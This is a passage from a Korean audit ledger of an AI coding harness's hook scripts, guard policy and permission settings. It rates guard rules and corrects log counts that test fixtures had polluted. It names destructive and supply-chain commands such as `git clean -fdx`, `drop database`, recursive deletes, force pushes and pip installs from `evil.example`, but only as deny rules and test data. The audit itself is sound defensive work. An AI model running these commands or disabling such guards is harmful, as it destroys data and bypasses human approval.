| P-53b | CLAUDE.md:92 | 파괴 명령 전 대상 확인 | DELETE |
| A-27 | AGENTS.md:45 | deprecated API 지양(일반 코드 품질) | DELETE |
| A-29 | AGENTS.md:49 | 문제 재현·진단 절차 일반 | DELETE |
| A-31 | AGENTS.md:51 | 설계 후 구현 일반 | DELETE |
| A-32 | AGENTS.md:52 | 구현 일반 | DELETE |
| A-33 | AGENTS.md:53 | 검증 후 완료 보고 | DELETE |

추가로 내장이 다루는 것으로 알려졌으나 **본 담당 3파일에는 없는** 주제: 임의 축소 금지·전체 완주, 메모리 저장 규칙, 응답 형식 일반. 즉 이 3파일에는 그 주제의 복제본이 없다(메모리 규칙은 워커 ④ 담당).

## 6. 층 x 판정 교차 집계

행 기준(P 65 · G 20 · A 51 = 총 136행). 아래 표는 원장 표를 기계 집계한 값이다.

| 층 | KEEP-CODE | DOWNGRADE | KEEP-FACT | KEEP-PREF | DELETE | MOVE-TO-CODE | COMPRESS | RESOLVE | 합 |
|---|---|---|---|---|---|---|---|---|---|
| L1 | 0 | 0 | 0 | 0 | 2 | 0 | 11 | 0 | 13 |
| L2 | 0 | 0 | 19 | 0 | 0 | 0 | 0 | 0 | 19 |
| L3 | 0 | 0 | 0 | 11 | 0 | 0 | 0 | 0 | 11 |
| L4 | 0 | 0 | 0 | 0 | 11 | 0 | 0 | 0 | 11 |
| L5 | 0 | 0 | 8 | 0 | 4 | 0 | 15 | 0 | 27 |
| L6 | 0 | 0 | 0 | 0 | 0 | 0 | 1 | 0 | 1 |
| L7 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 54 | 54 |
| **합** | **0** | **0** | **27** | **11** | **17** | **0** | **27** | **54** | **136** |

판정별 절감 추정 합계: **약 103줄**(P 37 · G 18 · A 48). 세 파일 합 234줄 중 44%.

집계 해설:
- `KEEP-CODE`·`DOWNGRADE`·`MOVE-TO-CODE` 가 0인 이유: 본 조각은 **산문만** 판정하므로(워커 지시) L1 행은 지침대로 COMPRESS 또는 DELETE 로만 판정했다. 코드 자체의 KEEP-CODE/DOWNGRADE 판정은 워커 ② 담당이다. MOVE-TO-CODE 가 0인 이유는 이 3파일에서 "텍스트가 못 막아 반복 위반된" 규칙을 하나도 찾지 못했기 때문이다 — `git log --since=2026-08-03` 에서 한자·인라인 스타일·jQuery·flag_modified 누락·deprecated API 관련 수정 커밋이 모두 0건이었다.
- 층-판정 조합은 지시서 §4.2 를 문자 그대로 따랐다: L2→KEEP-FACT, L3→KEEP-PREF, L4→DELETE, L5→KEEP-FACT/COMPRESS/DELETE, L6→COMPRESS, L7→RESOLVE, L1 산문→COMPRESS/DELETE.
- `RESOLVE` 54건이 최대 군집이며 그중 26건이 위 중복 매트릭스 D-01~D-26 에 직접 대응한다. 즉 **세 파일의 최대 비용은 실효 없는 규칙이 아니라 복제**다. 이는 지시서 가설 H4 를 정적 근거로 지지한다.
- `DELETE` 17건 전부에 복원 트리거를 붙였다(`A-30`,`A-31`,`A-32` 는 `A-29` 와 같은 트리거를 공유한다고 명시).
- 등급 마커 `**A`~`**D`(P-18~P-23)는 지시서 §5 항목 13 의 재분류 조건에 따라 L4 가 아니라 **L3 · KEEP-PREF** 로 넣었다. 사용자가 프롬프트에 직접 타이핑하는 선언이기 때문이다. 완주율(워커 ④)이 낮게 나오면 L4 로 되돌려 DELETE 후보가 된다 — 총괄 확정 대상.

## 7. 전수 대조

- 프로젝트 `CLAUDE.md`: 불릿·번호 항목 59개(`grep -nE '^\s*([-*]|[0-9]+\.)' CLAUDE.md | wc -l` = 59) + 비불릿 규칙 문장 2개(:28 등급 마커 헤딩의 "절차 생략 금지", :104 Compact instructions 본문) = **61 항목**.
- 전역 `~/.claude/CLAUDE.md`: 매칭 16행 중 :5·:9 는 굵은 글씨 문단(불릿 아님) + 비매칭 규칙 문단 3개(:14, :38, :42) = **19 항목**.
- `AGENTS.md`: 매칭 50행 중 구분선 `---` 2행(:5, :59) 제외 = 불릿 48개 + 비불릿 규칙 문단 3개(:3, :26, :71) = **51 항목**.

**P 61/61 · G 19/19 · A 51/51**

행 수는 P 65 · G 20 · A 51 = 136행이다(한 불릿에 층이 다른 정책 2개가 섞인 5건을 `a`/`b` 로 분할했다: `P-03`, `P-30`, `P-31`, `P-53`, `G-16`). 판정 빈칸 0, DELETE 17행 전부 복원 트리거 있음, 한자 0(지시서 §9.4 스니펫의 CJK 통합 한자 영역 정규식으로 기계 검증, 결과 0).


# 조각 2 — ledger-part-2-hooks.md

# 하네스 ablation v2 — 원장 조각 ② 훅·전역 훅·지연·로그 실효

- 담당 워커: 정적 감사 ②(ID `H-01`~`H-47`)
- 저장소 HEAD: `fe21a5cc3` (브랜치 `deploy`) — 지시서 기준 커밋 `46bdac44d` 와 다르다. 명령: `git log --oneline -1`
- 읽기 전용. 저장소 파일 무변경. 실 로그 오염 여부는 §9 에 적었다.

---

## 0. 먼저 읽을 것 — 사실 카드 3개가 틀렸다

| 지시서 | 원문 주장 | 이 조각의 재측정 | 명령 |
|---|---|---|---|
| §2.3 | "SHELL_GUARD_LOG 2026-08-03 이후 300행" | **로그는 300행 캡이라 2026-09-07 11:19 ~ 09-09 20:38, 2.4일치뿐이다.** 2026-08-03 이후 5주는 측정 불가(잘려 나갔고 gitignore 라 복원 불가) | `head -1`/`tail -1` + `.claude/hooks/guard_shell.py:39` `_LOG_CAP = 300` |
| §2.3·§5-4 | "`production 푸시` ask 16 · `pip install` 36 · `Remove-Item` 20 — 텍스트 규칙이 상시 로드된 상태에서도 시도됐다(H2 근거)" | **셋 다 실제 발화 0건.** 16/36/20 전부 오염 창 안이고 명령 문자열이 테스트 픽스처(`evil.example`, `Remove-Item -Recurse -Force x`) 그대로다 | 아래 §2.3 |
| §2.4·§5-18 | "`[ctx_gate]` 11행 = 55% 임계 리마인더 발화" | **11행은 전부 `transcript 부재 — 게이트 스킵`(발화 아님).** ctx_gate 는 발화해도 로그를 안 남긴다. 실제 발화는 상태 파일에 1건만 남아 있다(2026-09-09 16:56:20) | `grep "\[ctx_gate\]" docs/harness/logs/CLAUDE_HOOK_LOG.md` + `cat docs/harness/runtime/.ctx_gate_state.json` |

---

## 1. 항목별 판정표

층 = §4.1 (L1 코드 강제 / L2 환경 사실 / L3 취향 / L4 절차 / L5 규약 / L6 재주입 / L7 상충).
판정 = §4.2 (KEEP-CODE / DOWNGRADE / KEEP-FACT / KEEP-PREF / DELETE / MOVE-TO-CODE / COMPRESS / RESOLVE).
`결함` 은 판정이 아니라 별도 등재 항목이므로 판정 열에 §4.2 값 + 괄호로 표기했다.

### 1.1 session_start.py (SessionStart, 225줄)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-01 | `.claude/hooks/session_start.py:24-36` | SESSION_LOG 세션 블록 기록 | L6 | SESSION_LOG.md 에 20블록 유지(`grep -c "^### Session:" docs/harness/runtime/SESSION_LOG.md` = 20). 이 로그를 읽는 코드는 `session_stop.py:53` 갱신뿐 — 모델 컨텍스트에 안 들어감 | DOWNGRADE | 225줄 중 13줄 + 세션당 1회 파일쓰기 | 세션 사후 추적 수단 소실 | 세션 간 편집 귀속을 다시 못 가릴 때 | 신규 |
| H-02 | `.claude/hooks/session_start.py:177-192` | compact 재개 시 CHECKPOINT 포인터 주입 | L6 | `source=="compact"` 에만 1문장 주입. CLAUDE.md "컴팩트" 절과 같은 말(중복) | COMPRESS | CLAUDE.md 1줄 삭제 | compact 후 맥락 유실 | compact 재개 직후 엉뚱한 작업 재개가 보이면 | 신규 |
| H-03 | `.claude/hooks/session_start.py:39-69` | MEMORY-GATE 160줄 초과 권고 | L6 | 임계 160, 현재 MEMORY.md **159줄** — 한 줄 차이로 **한 번도 발화한 적 없다**. `wc -l "C:/Users/USER/.claude/projects/c--DEV-FOMS/memory/MEMORY.md"` = 159 | DELETE | 31줄 | 메모리 인덱스가 200줄 캡을 넘겨 조용히 잘림 | MEMORY.md 가 200줄을 넘겨 항목이 사라진 사건이 1건 보이면 | 신규 |
| H-04 | `.claude/hooks/session_start.py:111-154` | 새 세션 CONCURRENT-EDIT 경고(30분 창) | L6 | EDIT_LOG 기반인데 EDIT_LOG 는 워크트리 편집을 전부 스킵(H-29). 최근 9일 EDIT_LOG 50행 vs 스킵 253행 → 감지 모집단의 약 84%가 사각 | DOWNGRADE | 44줄 | 동시 편집 충돌 미고지 | 같은 파일 덮어쓰기 사고가 재발하면 | 신규 |
| H-05 | `.claude/hooks/session_start.py:203-206` → `ctx_gate.py:108-137` | compact baseline 굳히기 | L6 | ctx_gate(H-06) 의 보조. H-06 를 지우면 같이 사라진다 | DELETE(H-06 종속) | 30줄 | 없음(H-06 유지 시 필수) | H-06 를 유지하기로 하면 되살린다 | 신규 |

### 1.2 ctx_gate.py (UserPromptSubmit, 187줄)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-06 | `.claude/hooks/ctx_gate.py:41-48,140-173` | 55% 컨텍스트 임계 원장 리마인더 | L6 | 발화 로그 없음(코드에 `hook_log` 호출 자체가 없다). 상태 파일에 마지막 발화 1건(2026-09-09 16:56:20). 그 뒤 30분 안에 `docs/AI_STATUS.md`·`docs/plans/*ledger*.md` 커밋 **0건**(§4 표) | DELETE | 187줄 + 프롬프트당 49ms | 1M 창에서 원장 갱신 없이 auto-compact | 컴팩트 뒤 원장이 비어 작업이 중복 재실행되는 사건 1건 | 신규 |
| H-07 | `.claude/hooks/ctx_gate.py:31-34` | 상태 파일이 세션 공용(단일) | L6(결함) | 주석이 직접 인정: "동시 세션이 서로의 baseline 을 덮는다". 실제 상태 파일 session_id 는 1개(`c58dbabc-...`)뿐 | DOWNGRADE(결함 등재) | — | 리마인더 조기·중복 발화 | H-06 유지 시 세션별 파일 분리 | 신규 |
| H-08 | `.claude/hooks/ctx_gate.py:143-145` | transcript 부재 fail-open 로그 | L6(결함) | 로그 11행 전부 이것. **세션 첫 프롬프트에는 transcript 파일이 아직 없어** 매 세션 1행씩 쌓인다. 발화는 안 남기고 스킵만 남기는 비대칭 | COMPRESS | 로그 300행 중 14행(4.7%) | 없음 | — | 신규 |

### 1.3 pre_compact.py (PreCompact, 60줄)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-09 | `.claude/hooks/pre_compact.py:42-56` | COMPACT_CHECKPOINT.md 생성 | L6 | 파일 실존(4,666B, 2026-09-09 14:39 갱신) — 실제로 쓰이고 있다. 컨텍스트 주입 없음(파일 부수효과만), 압축 때만 1회 실행이라 턴당 비용 0 | COMPRESS | 0ms(턴당 비용 없음) | 압축 뒤 복원 지점 소실 | — | 신규 |

### 1.4 guard_shell.py (PreToolUse:Bash, 131줄) + guard_policy.py (908줄)

훅 배선 자체는 실제 ask 131건이 있으므로 KEEP-CODE. 아래는 규칙 단위 판정이다.
**관측창은 2.4일뿐이므로(§0) 발화 0건 규칙의 확신은 낮다** — 각 행 상태 열에 표기했다.

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-10 | `.claude/hooks/guard_shell.py:101-127` | 훅 배선(PreToolUse:Bash) 자체 | L1 | 오염 제외 실제 발화 136건(ask 131 · deny 5) / 2.4일. 명령: §2.1 | KEEP-CODE | — | 없음 | — | 신규 |
| H-11 | `tools/harness/guard_policy.py:319` | 보호 브랜치 강제 푸시 deny | L1 | 실제 발화 **0**(관측 26건 전부 테스트 픽스처). `permissions.deny` H-39·H-40 과 **완전 중복** | DOWNGRADE | 규칙 1개 | 강제 푸시로 원격 히스토리 파괴 | 보호 브랜치 강제 푸시 시도가 1건 관측되면 | 확신 낮음(관측창 2.4일) |
| H-12 | `tools/harness/guard_policy.py:323` | production 푸시 ask | L1 | 실제 발화 **0**(16건 전부 오염, 명령이 픽스처 그대로). `permissions.deny` H-38 과 부분 중복(`origin production*` 만) | DOWNGRADE | 규칙 1개 | 무단 운영 승격 | 명시 요청 없는 production 대상 명령이 1건 관측되면 | 확신 낮음(관측창 2.4일) |
| H-13 | `tools/harness/guard_policy.py:260-278` | deploy 푸시 타 세션 커밋 포함 ask | L1 | **실제 발화 95건**(유니크 분 90 — 재시도 버스트 아님). 오염 0. 이 하네스에서 가장 많이 일하는 규칙 | KEEP-CODE | — | 없음. 단 2.4일 95회 = 하루 약 40회 확인 요구(마찰 비용) | — | 신규 |
| H-14 | `tools/harness/guard_policy.py:351-360` | reset --hard / reset --hard origin | L1 | 실제 발화 6건(deny 3 · ask 5 중 관측 5). **6건 전부 `c:/tmp` 폐기 워크트리 정리 중 = 오탐 100%** | DOWNGRADE | 규칙 1개 + 오탐 6건/2.4일 | 로컬 커밋 파괴 | 공유 트리(`c:/DEV/FOMS`) 대상 `reset --hard` 가 1건 관측되면 | 신규 |
| H-15 | `tools/harness/guard_policy.py:363-370` | git clean 강제 삭제 deny | L1 | 실제 발화 1건(2026-09-07 11:19:13 `git clean -fdx`). 명령이 테스트 픽스처와 **글자 그대로 같아** 정탐/오염 판정 불가 | KEEP-CODE | — | 없음 | — | **판정 불가 1건 — 애매** |
| H-16 | `tools/harness/guard_policy.py:412-438` | rm 재귀 삭제(루트/상위) deny | L1 | 실제 발화 2건(09-09 11:32, 14:27). 둘 다 `C:/tmp/*` 워크트리 정리 = **오탐 100%**. `_is_temp_path()`(`:469`)는 Remove-Item 에만 적용되고 `_classify_rm` 에는 안 걸려 있다 | DOWNGRADE | 규칙 1개 + 오탐 2건/2.4일 | 루트 재귀 삭제 | 임시폴더 밖 절대경로 `rm -rf` 가 1건 관측되면 | 신규 |
| H-17 | `tools/harness/guard_policy.py:518-541` | Remove-Item 재귀강제 ask / del /s /q deny | L1 | 실제 발화 **0**(20건 전부 픽스처: `x`, `C:\tmp\..\DEV\FOMS` 등) | DOWNGRADE | 규칙 1개 | PowerShell 재귀 삭제 | PowerShell 경로로 실제 삭제 시도가 관측되면 | 확신 낮음(관측창 2.4일) |
| H-18 | `tools/harness/guard_policy.py:544-551` | DB 파괴(drop/truncate/무조건 DELETE) deny | L1 | 실제 발화 **0**(4건 전부 픽스처 `drop database x;`) | DOWNGRADE | 규칙 1개 | 운영 DB 파괴 | DB 클라이언트로 파괴 구문이 1건 관측되면 | 확신 낮음(관측창 2.4일) |
| H-19 | `tools/harness/guard_policy.py:564-585` | pip install 공급망 위험 ask | L1 | 실제 발화 **0**(36건 전부 픽스처 `evil.example`). 기본 PyPI 설치는 이미 allow | DOWNGRADE | 규칙 1개 | 대체 인덱스 공급망 공격 | 대체 인덱스·VCS 직접 설치 시도가 관측되면 | 확신 낮음(관측창 2.4일) |
| H-20 | `tools/harness/guard_policy.py:587-594` | npm 전역 설치 ask | L1 | 실제 발화 **0**, 오염도 0(CASES 에 없음) | DOWNGRADE | 규칙 1개 | 전역 패키지 오염 | npm -g 설치 시도가 관측되면 | 확신 낮음 |
| H-21 | `tools/harness/guard_policy.py:373-378` | git checkout -- ask | L1 | 실제 발화 29건. 대부분 임시 트리·스크래치패드 안 복합 명령이고 2건은 `--ours`/`--theirs`(충돌 해소지 폐기 아님) = 오탐. 나머지는 승격 트리 conflict 처리 맥락 | DOWNGRADE | 규칙 1개 + 오탐 29건/2.4일 | 미저장 작업 폐기 | 공유 트리 대상 `git checkout -- <추적파일>` 이 관측되면 | **오탐 과반 판정이 애매** |
| H-22 | `tools/harness/guard_policy.py:768` | 드라이브 포맷 deny | L1 | 실제 발화 0, 오염 0 | DOWNGRADE | 규칙 1개 | 드라이브 포맷 | 관측되면 | 확신 낮음 |
| H-23 | `tools/harness/guard_policy.py:793` | 언랩 깊이 상한 초과 ask | L1 | 실제 발화 0, 오염 0 | DOWNGRADE | 규칙 1개 | 중첩 래핑 우회 | 관측되면 | 확신 낮음 |
| H-24 | `tools/harness/guard_policy.py:601-731` | 우회 봉합(래퍼·shell -c·서브셸·KEY=VAL·개행) | L1 | 실제 발화 0. 그러나 이것은 규칙이 아니라 H-11~H-23 의 **적용 범위**다 — 규칙을 하나라도 남기면 같이 남아야 한다 | KEEP-CODE | — | 봉합 제거 시 나머지 규칙 전부 우회 가능 | — | 신규 |
| H-25 | `.claude/hooks/guard_shell.py:57-84` | SHELL_GUARD_LOG 기록(300행 캡) | L1 보조 | 300행 캡 = 2.4일치. **가드 실효를 측정하려고 만든 로그가 실효 측정을 불가능하게 만든다.** gitignore(`.gitignore:125`)라 이력 복원도 불가 | COMPRESS | — | 실효 판정 근거 영구 소실 | — | **결함 등재 · 애매(캡 상향 vs 삭제)** |

### 1.5 track_edits.py (PostToolUse:Edit|Write, 300줄)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-26 | `.claude/hooks/track_edits.py:284-286` | EDIT_LOG 편집 기록 | L6 | 50행 캡, 최근 9일 50행. 소비처 3곳(`session_start.py:131`·`session_stop.py:57`·`pre_compact.py:38`) — 전부 H-01·H-04·H-09 | DOWNGRADE | Edit 1회당 51ms 중 일부 | 편집 이력 추적 소실 | 편집 파일 목록 복원이 필요해지면 | 신규 |
| H-27 | `.claude/hooks/track_edits.py:62-92,279-282` | `.py` 편집 → Stop 게이트 pending 기록 | L1 보조 | H-35(Stop 게이트)의 입력. 게이트를 유지하면 필수 | KEEP-CODE | — | 없음 | — | 신규 |
| H-28 | `.claude/hooks/track_edits.py:152-161,206-209` | CONCURRENT-EDIT-LIVE 주입 | L6 | 상태 파일에 누적 발화 59건. 그러나 파일 mtime 이 **2026-08-31 16:18** — 그 뒤 9일간 0회 발화. 이유: 세션이 격리 워크트리로 옮겨가 편집이 EDIT_LOG 에 안 들어간다(H-29) | DELETE | 70줄 | 동시 편집 충돌 미고지 | 공유 트리에서 두 세션이 같은 파일을 덮는 사고가 재발하면 | 신규 |
| H-29 | `.claude/hooks/track_edits.py:164-169,210-213` | CONCURRENT-EDIT-COLLISION 주입 | L6 | 누적 7건, 역시 2026-08-31 이후 0회 | DELETE | 20줄 | 같은 파일 덮어쓰기 | 위와 같음 | 신규 |
| H-30 | `.claude/hooks/track_edits.py:267-270` | 트리밖 편집 스킵 + 정보성 로그 | L6(결함) | CLAUDE_HOOK_LOG 300행 중 **253행(84.3%)** 이 이 한 줄. 3.2일치. 훅이 스스로 만든 소음이 fail-open 실패 로그를 덮는다 | COMPRESS | 로그 253행 | 없음 | — | **결함 등재** |

### 1.6 post_bash.py (PostToolUse:Bash, 42줄) + 하위 2모듈

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-31 | `.claude/hooks/post_bash.py:20-38` | 디스패처(프로세스 2→1 통합) | L6 | 통합 자체가 지연 절감책. 재측정 49ms(§7) | KEEP-CODE | 하위 모듈 유지 시 약 30ms 절약 | 없음 | — | 신규 |
| H-32 | `.claude/hooks/record_commit_ledger.py:32-59` | 커밋 세션 레저 기록 | L1 보조 | `session_commit_ledger.json` 61,833B 실사용. H-13(deploy 푸시 범위 판정)의 입력 — 레저가 없으면 "deploy 푸시 레저 없음" ask 로 떨어진다(실제 2건 관측) | KEEP-CODE | — | H-13 판정 불가 | — | 신규 |
| H-33 | `.claude/hooks/post_push_watch.py:114-153` | push 성공 시 CI-GATE 리마인더 주입 | L6 | 발화 로그 없음(주입만 하고 기록 안 함). CLAUDE.md "push 후 CI 확인(논블로킹)" 문단과 **글자 단위로 같은 지시** = 중복 | RESOLVE | 164줄 또는 CLAUDE.md 3줄 | push 뒤 CI red 방치 | CI red 를 모른 채 다음 작업으로 넘어간 사건 1건 | 신규 |

### 1.7 session_stop.py (Stop, 80줄)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-34 | `.claude/hooks/session_stop.py:42-63` | SESSION_LOG 종료 필드 갱신 | L6 | 실패 로그 9건(`세션 블록 없음 — 갱신 no-op`, 실 세션 id 3종). H-01 종속 | DOWNGRADE | 22줄 | 세션 기록 미완결 | H-01 유지 시 같이 유지 | 신규 |
| H-35 | `.claude/hooks/session_stop.py:22-39` | 임시 파일 4종 정리 | L6 | 대상은 `commit_msg.txt` 등 — CLAUDE.md "커밋 후 임시 파일 삭제" 규칙의 코드 이행. 산문 규칙과 중복 | RESOLVE | CLAUDE.md 반줄 | 커밋 임시파일 잔류 | — | 신규 |

### 1.8 quality_check.py (Stop, 211줄)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-36 | `.claude/hooks/quality_check.py:138-172` | pending `.py` → `import app` Stop 게이트(exit 2) | L1 | 차단 경로(`:166-172`)는 **stderr 만 쓰고 `_log_hook_error` 를 안 부른다** → 차단은 어디에도 기록되지 않는다. `HOOK_RUNTIME_LOG.txt`·`CLAUDE_HOOK_LOG.md` 둘 다 0건(§3). 즉 "차단 0" = **기록 안 함** | KEEP-CODE | — | 없음 | — | 신규 |
| H-37 | `.claude/hooks/quality_check.py:166-172` | 차단 시 기록 부재 | L1(결함) | 위와 같음. 실효를 영원히 측정할 수 없다 | MOVE-TO-CODE(로깅 추가) | — | 게이트 가치 판정 불가 상태 지속 | — | **결함 등재** |
| H-38 | `.claude/hooks/quality_check.py:30-38,89-135` | Stop 시 인벤토리 3종 자동 재생성 | L1 보조 | 이 자동화가 있는데도 게이트 도입 뒤 인벤토리 churn 커밋 **38건**(§6). 스캐너 997줄 + 인벤토리 6,553줄 유지 비용 | DOWNGRADE | 스캐너 997줄 + 인벤토리 6,553줄 + Stop 당 최대 60초×3 | 인벤토리 드리프트 CI red | lineno 무관 비교로 전환한 뒤에도 신규/제거 catch 를 놓친 사건이 보이면 | 신규 |
| H-39 | `.claude/hooks/quality_check.py:186-190` | 체크리스트 리마인더(2026-08-03 제거됨) | L6 | 이미 삭제 완료 — 직전 ablation 판정이 유지되고 있음을 확인 | 유지(조치 없음) | — | 없음 | — | 확인만 |

### 1.9 permissions.deny 3줄 (`.claude/settings.json:20-24`)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-40 | `.claude/settings.json:21` | deny `Bash(git push origin production*)` | L1 | 발화는 로그가 없어 측정 불가(permissions 계층은 SHELL_GUARD_LOG 에 안 남는다). **패턴이 `origin production*` 뿐이라 `git push origin HEAD:production` 은 안 막는다** — 승격 헬퍼(`tools/harness/promote_own_to_production.py:9`)가 그 형태를 안 쓴다고 명시한 것과 정합 | KEEP-CODE | 0ms(프로세스 없음) | 없음 | — | 신규 |
| H-41 | `.claude/settings.json:22` | deny `Bash(git push --force*)` | L1 | H-11 과 중복. 이쪽은 **브랜치 무관 전면 금지**라 더 강하고 비용 0 | KEEP-CODE | 0ms | 없음 | — | 신규 |
| H-42 | `.claude/settings.json:23` | deny `Bash(git push -f *)` | L1 | H-41 의 짧은 형태 | KEEP-CODE | 0ms | 없음 | — | 신규 |

### 1.10 전역 훅 (`~/.claude/settings.json`)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감 | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| H-43 | `~/.claude/settings.json` UserPromptSubmit·Stop·StopFailure·SubagentStart·SubagentStop·TeammateIdle·PreToolUse·PostToolUse·PostToolUseFailure·PermissionRequest (10이벤트) | orca `claude-hook.cmd` 배선 | L6 | 이 환경에 `ORCA_AGENT_HOOK_PORT`/`TOKEN`/`PANE_KEY` 없음(`env \| grep ^ORCA` 무출력) → `:orca_agent_hook_drain_stdin` 로 빠져 stdin 만 버리고 exit 0. **재측정 28ms × 도구 호출당 2회** | DELETE | 도구 호출당 56ms(Bash 158ms 중 35%, Edit 108ms 중 52%) | orca 앱에서 기동한 세션의 pane 연동 파손 | orca 앱 안에서 에이전트를 다시 굴리기 시작하면 | **사용자 결정 필요(§8)** |
| H-44 | `~/.claude/settings.json` Stop `_gstack_source: gstack-timeline-stop` | gstack `timeline-stop-hook` | L6 | 실체 확인: `~/.claude/skills/gstack/hosts/claude/hooks/timeline-stop-hook`(457B bash shim) → `timeline-stop-hook.ts`(8,012B) via bun. `bun 1.3.11` 실존 → **동작한다**(무동작 아님). Stop 당 1회, bun 기동 비용은 미측정 | DOWNGRADE | Stop 당 bun 기동 1회 | gstack 타임라인 텔레메트리 소실 | gstack 스킬 사용 중 타임라인이 비면 | 신규 |
| H-45 | `~/.claude/settings.json` `permissions.defaultMode` | `bypassPermissions` + `skipDangerousModePermissionPrompt: true` | L7 | 전역이 권한 확인을 통째로 우회하도록 설정돼 있다. 이 상태에서 `guard_policy` 의 **ask 판정 131건이 실제 확인 프롬프트를 띄웠는지 확신할 수 없다**(ask 는 로그만 남긴다) | RESOLVE | — | ask 규칙 전체가 무력할 가능성 | — | **애매 — `claude-code-guide` 로 "bypassPermissions 에서 훅 ask 가 프롬프트를 띄우는가" 확인 필요** |
| H-46 | `~/.claude/settings.json` `permissions.allow` 중 `Bash(git push:*)`·`Bash(git checkout *)`·`Bash(git commit *)`·`Bash(git merge *)`·`Bash(git rm *)`·`Bash(git add *)` | 전역 allow 가 프로젝트 가드와 정면 충돌 | L7 | 전역이 모든 `git push` 를 허용. 프로젝트 `permissions.deny` 3줄(H-40~42)과 `guard_policy` ask 가 이것을 이겨야만 정책이 성립한다 | RESOLVE | allow 6줄 | 승격 정책 무력화 | — | **애매 — deny/allow 우선순위 확인 필요** |
| H-47 | `~/.claude/settings.json` `permissions.allow` 채널톡 curl 등 약 130줄 | 1회성 조사 잔여 allow | L7 | 채널톡·designer pytest·railway 등 종료된 조사의 1회성 항목 다수 | DELETE | 약 110줄 | 없음(재승인만 하면 됨) | — | 신규 |

---

## 2. 가드 실효 집계 (`docs/harness/logs/SHELL_GUARD_LOG.md`)

### 2.1 모집단과 오염 분리

| 구분 | 값 | 명령 |
|---|---|---|
| 로그 데이터 행 | 300 (캡 상한) | `grep -c "^\| 20" docs/harness/logs/SHELL_GUARD_LOG.md` |
| 실제 기간 | 2026-09-07 11:19:13 ~ 2026-09-09 20:38:29 (**2.4일**) | `grep "^\| 20" ... \| head -1` / `\| tail -1` |
| 2026-08-03 이후 decision | ask 207 · deny 93 | `awk -F'\|' '/^\\\| 20/{gsub(/ /,"",$2); if($2>="2026-08-03"){gsub(/ /,"",$3); print $3}}' docs/harness/logs/SHELL_GUARD_LOG.md \| sort \| uniq -c` |
| 같은 초 20행 이상 묶음 | **0** — 오염은 초 단위가 아니라 **20~25초 창**에 흩어져 있다 | `awk -F'\|' '/^\\\| 20/{gsub(/^ +\| +$/,"",$2); print $2}' ... \| sort \| uniq -c \| awk '$1>=20'` |
| 오염 창 ①(2026-09-07 12:02:06~12:02:31) | deny 44 · ask 38 = **82행** | `awk -F'\|' '... if($2>="2026-09-07 12:02:00" && $2<="2026-09-07 12:02:59") print $3' ... \| sort \| uniq -c` |
| 오염 창 ②(2026-09-09 16:50:45~16:50:55) | deny 44 · ask 38 = **82행** | 같은 명령, 09-09 16:50 창 |
| 오염 합계 | **164행 = 300행의 54.7%** | 위 두 값 합 |
| 실제 발화 | **136행** (ask 131 · deny 5) | 300 − 164 |

### 2.2 오염을 만든 테스트 (경로:행)

| 경로:행 | 무엇 | 산출 행 수 |
|---|---|---|
| `tests/harness/test_guard_policy.py:28-119` | `CASES` 테이블 61건(deny 21 · ask 19 · allow 21) | 판정 로그 대상 40 |
| `tests/harness/test_guard_policy.py:121-140` (`_run_claude_hook`) | `.claude/hooks/guard_shell.py` 를 `cwd=REPO_ROOT` 로 subprocess 실행 | 40 |
| `tests/harness/test_guard_policy.py:142-175` (`_run_cursor_hook`) | `.cursor/hooks/guard_shell.py` 실행 — 같은 `harness_log_path("SHELL_GUARD_LOG.md")` 로 기록(`.cursor/hooks/guard_shell.py:96-117`) | 40 |
| `tests/harness/test_guard_policy.py:224-240` (`test_claude_deny_uses_new_schema`) | deny 1건 추가 | 1 |
| `tests/harness/test_guard_policy.py:257-280` (`test_cursor_deny_stops_continue`) | deny 1건 추가 | 1 |
| **합계** | 1회 실행당 | **82행** (관측된 창 크기와 정확히 일치) |

근본 원인: 훅 스크립트가 로그 경로를 `get_project_root()` 로 스스로 계산하고(`.claude/hooks/shared_utils.py:67-89`) 테스트가 `cwd=REPO_ROOT` 로 실행하므로, 로그 경로를 주입할 지점이 없다. 로그는 gitignore(`.gitignore:125`)라 오염이 `git status` 에 안 보인다.

### 2.3 오염이 삼킨 항목 — 사실 카드 §2.3 정정

| 사유 | 지시서 §2.3 | 오염 포함 재집계 | **오염 제외 실제** | 명령 |
|---|---|---|---|---|
| deploy 푸시 타 세션 커밋 포함 | 94 | 95 | **95** | 아래 |
| pip install | 36 | 36 | **0** | 아래 |
| checkout -- | 28 | 29 | **29** | 아래 |
| Remove-Item 재귀 강제 삭제 | 20 | 20 | **0** | 아래 |
| production 푸시 | 16 | 16 | **0** | 아래 |
| reset --hard | 9 | 9 | **5** | 아래 |
| deploy 푸시 레저 없음 | 1 | 2 | **2** | 아래 |

명령(오염 제외):
```
awk -F'|' '/^\| 20/ && $3 ~ /ask/{gsub(/^ +| +$/,"",$2); gsub(/^ +| +$/,"",$4);
